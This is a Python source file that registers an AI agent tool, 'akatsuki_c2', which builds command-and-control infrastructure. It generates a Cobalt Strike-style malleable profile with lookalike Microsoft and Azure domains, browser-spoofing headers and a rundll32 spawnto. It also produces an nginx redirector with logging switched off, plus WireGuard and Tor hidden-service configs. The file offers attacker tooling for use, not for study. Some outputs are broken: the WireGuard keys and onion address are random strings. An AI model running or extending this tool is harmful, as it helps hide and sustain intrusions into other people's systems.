import json
import logging
import random
import string
from datetime import datetime

from tools.registry import registry, tool_error, tool_result

logger = logging.getLogger(__name__)


def _rand_id(length: int = 6) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def generate_cs_profile(lhost: str, lport: int = 443) -> dict:
    fallback_domains = [
        "microsoft-update{id}.com",
        "cdn-azure{id}.net",
        "cloudfront-cdn{id}.org",
    ]
    return {
        "name": "akatsuki_c2_profile",
        "sleep": "60 30",
        "jitter": "30",
        "http_config": {
            "headers": [
                {"name": "User-Agent", "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                {"name": "Accept", "value": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
            ],
        },
        "https_config": {
            "hosts": [f"www.{d.format(id=_rand_id())}" for d in fallback_domains],
        },
        "dns_config": {"beacon": "none", "sleep": 120},
        "listeners": [
            {"type": "https", "host": lhost, "port": lport, "profile": "akatsuki_c2_profile"},
            {"type": "dns", "host": f"dns{_rand_id(4)}.{_rand_id()}.com", "port": 53},
        ],
        "post_ex": {
            "pipename": f"akatsuki_{_rand_id(8)}",
            "spawnto": "rundll32.exe",
        },
    }


def generate_redirector(lhost: str, lport: int) -> str:
    redirector_ports = [443, 8443, 4443, 9443, 8080]
    return (
        f"server {{\n"
        f"    listen {random.choice(redirector_ports)} ssl http2;\n"
        f"    server_name www.{_rand_id()}.com;\n"
        f"    ssl_certificate /etc/ssl/certs/selfsigned.crt;\n"
        f"    ssl_certificate_key /etc/ssl/private/selfsigned.key;\n"
        f"    location / {{\n"
        f"        proxy_pass https://{lhost}:{lport};\n"
        f"        proxy_set_header Host $host;\n"
        f"        proxy_set_header X-Real-IP $remote_addr;\n"
        f"        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n"
        f"        proxy_ssl_verify off;\n"
        f"    }}\n"
        f"    access_log off;\n"
        f"    error_log /dev/null;\n"
        f"}}"
    )


def generate_wireguard(lhost: str) -> dict:
    private = "".join(random.choices(string.ascii_letters + string.digits, k=32))
    public = "".join(random.choices(string.ascii_letters + string.digits, k=32))
    return {
        "interface": {
            "PrivateKey": private,
            "Address": "10.0.0.1/24",
            "ListenPort": 51820,
        },
        "peer": {
            "PublicKey": public,
            "AllowedIPs": "10.0.0.0/24, 172.16.0.0/12",
            "Endpoint": f"{lhost}:51820",
            "PersistentKeepalive": 25,
        },
    }


def generate_tor_hidden_service(local_port: int = 8080) -> str:
    onion = "".join(random.choices(string.ascii_lowercase + "234567", k=16))
    return (
        f"HiddenServiceDir /var/lib/tor/akatsuki_{onion[:8]}/\n"
        f"HiddenServicePort 80 127.0.0.1:{local_port}\n"
        f"# HS: {onion}.onion"
    )


AKATSUKI_C2_SCHEMA = {
    "name": "akatsuki_c2",
    "description": "AKATSUKI C2 Builder — generate Cobalt Strike Malleable C2 profiles, nginx redirector configs, WireGuard VPN setups, and Tor hidden service configurations for command & control infrastructure.",
    "parameters": {
        "type": "object",
        "properties": {
            "action": {
                "type": "string",
                "enum": ["cs_profile", "redirector", "wireguard", "tor_hs", "all"],
                "description": "C2 component to generate",
            },
            "lhost": {
                "type": "string",
                "description": "Listener host/IP for the C2 server",
            },
            "lport": {
                "type": "integer",
                "description": "Primary listener port (default: 443)",
            },
        },
        "required": ["action", "lhost"],
    },
}


def akatsuki_c2(action: str, lhost: str, lport: int = 443) -> str:
    if action == "cs_profile":
        return tool_result(generate_cs_profile(lhost, lport))
    elif action == "redirector":
        return tool_result({
            "type": "nginx_redirector",
            "config": generate_redirector(lhost, lport),
        })
    elif action == "wireguard":
        return tool_result(generate_wireguard(lhost))
    elif action == "tor_hs":
        return tool_result({
            "type": "tor_hidden_service",
            "config": generate_tor_hidden_service(lport),
        })
    elif action == "all":
        return tool_result({
            "c2_type": "multi-protocol",
            "host": lhost,
            "primary_port": lport,
            "cs_profile": generate_cs_profile(lhost, lport),
            "nginx_redirector": generate_redirector(lhost, lport),
            "wireguard": generate_wireguard(lhost),
            "tor_hidden_service": generate_tor_hidden_service(lport),
            "generated_at": datetime.now().isoformat(),
        })
    return tool_error(f"Unknown action: {action}")


def check_akatsuki_c2_requirements() -> bool:
    return True


registry.register(
    name="akatsuki_c2",
    toolset="akatsuki",
    schema=AKATSUKI_C2_SCHEMA,
    handler=lambda args, **kw: akatsuki_c2(
        action=args["action"],
        lhost=args["lhost"],
        lport=args.get("lport", 443),
    ),
    check_fn=check_akatsuki_c2_requirements,
    emoji="🌐",
)
